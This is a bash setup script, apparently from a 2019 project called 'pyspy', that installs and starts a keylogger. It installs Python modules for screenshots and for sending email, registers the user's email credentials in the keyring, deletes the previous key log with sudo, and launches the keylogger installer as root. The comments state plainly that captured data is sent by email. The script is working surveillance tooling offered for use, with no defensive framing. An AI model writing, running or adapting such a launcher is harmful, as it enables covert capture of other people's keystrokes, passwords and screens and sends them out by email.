#!/bin/bash

# the purpose of this script is to do the setup and begin running the keylogger for you
# this script will take your pyspy server email and password. It will then add the 
# pair to the keyring for authentication use. Make sure to give the script
# executable rights and to have the path variable setup correctly in you .bash_profile.
# If you don't then you could run into some issues with running the script

# Brady Murphy
# June 17, 2019

# install the python modules if needed
pip3 install keyring # used for email verification
pip3 install yagmail # used to send emails over python
pip3 install pillow  # pyscreenshot dependency
pip3 install pyscreenshot # used to take screenshots of computer

# check to see if the format file exists
FILE=./src/format.txt
if ! [ -f "$FILE" ]; then
	echo "format.txt file not found in src folder"
	echo "please add the file and initalize it as described in the readme.md"
	exit 1;
fi

# run the email setup script, then installer
python3 src/setup.py

# remove the previous log
FILE=key_log.txt
if [ -f "$FILE" ]; then
    sudo rm $FILE
	echo "Removed previous log history"
fi

# run the script
sudo python3 src/installer.py
